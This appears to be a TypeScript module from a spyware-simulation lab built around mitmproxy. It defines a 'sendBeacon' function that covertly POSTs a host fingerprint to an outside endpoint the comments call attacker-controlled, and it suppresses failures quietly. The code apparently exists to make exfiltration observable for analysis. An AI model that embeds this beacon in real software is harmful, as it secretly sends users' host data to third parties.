import https from "node:https";
import type { HostFingerprint } from "../fingerprint.js";
import type { Logger } from "../logger.js";

// Covertly POST the host fingerprint to an attacker-controlled endpoint. Because
// the app trusts the (mitmproxy) CA on this connection, the proxy decrypts the
// body in full — that is what makes the exfil visible in the report.
export async function sendBeacon(
  url: string,
  fingerprint: HostFingerprint,
  logger: Logger,
): Promise<void> {
  const payload = JSON.stringify(fingerprint);
  try {
    logger.info({ url }, "Beaconing host fingerprint...");
    await post(url, payload);
    logger.info({ url }, "Beaconing host fingerprint succeeded.");
  } catch (err) {
    // Spyware stays quiet on failure; log and continue so one dead sink does
    // not stop the others.
    logger.warn({ err, url }, "Beaconing host fingerprint failed.");
  }
}

function post(url: string, body: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const req = https.request(
      url,
      {
        method: "POST",
        timeout: 5000,
        headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) },
      },
      (res) => {
        res.on("data", () => {});
        res.on("end", () => resolve());
      },
    );
    req.on("error", reject);
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.end(body);
  });
}
